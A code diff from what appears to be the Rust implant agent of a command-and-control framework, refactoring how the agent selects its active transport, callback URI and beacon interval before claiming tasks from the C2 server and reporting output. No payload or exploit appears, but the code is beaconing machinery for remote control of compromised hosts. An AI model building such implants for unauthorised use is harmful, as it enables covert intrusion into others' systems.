@@ -1,5 +1,5 @@
 use crate::task::TaskHandle;
-use anyhow::Result;
+use anyhow::{Context, Result};
 use pb::{c2::ClaimTasksRequest, config::Config};
 use std::time::{Duration, Instant};
 use transport::Transport;
@@ -88,7 +88,17 @@ impl<T: Transport + 'static> Agent<T> {
      * Callback once using the configured client to claim new tasks and report available output.
      */
     pub async fn callback(&mut self) -> Result<()> {
-        self.t = T::new(self.cfg.callback_uri.clone(), self.cfg.proxy_uri.clone())?;
+        //TODO: De-dupe this fields - probably just need to pass the config not the callback URI.
+        self.t = T::new(
+            self.cfg
+                .info
+                .clone()
+                .context("failed to get info")?
+                .active_transport
+                .context("failed to get transport")?
+                .uri,
+            self.cfg.clone(),
+        )?;
         self.claim_tasks(self.t.clone()).await?;
         self.report(self.t.clone()).await?;
         self.t = T::init(); // re-init to make sure no active connections during sleep
@@ -121,7 +131,10 @@ impl<T: Transport + 'static> Agent<T> {
             }
 
             let interval = match self.cfg.info.clone() {
-                Some(b) => Ok(b.interval),
+                Some(b) => Ok(b
+                    .active_transport
+                    .context("failed to get transport")?
+                    .interval),
                 None => Err(anyhow::anyhow!("beacon info is missing from agent")),
             }?;
             let delay = match interval.checked_sub(start.elapsed().as_secs()) {
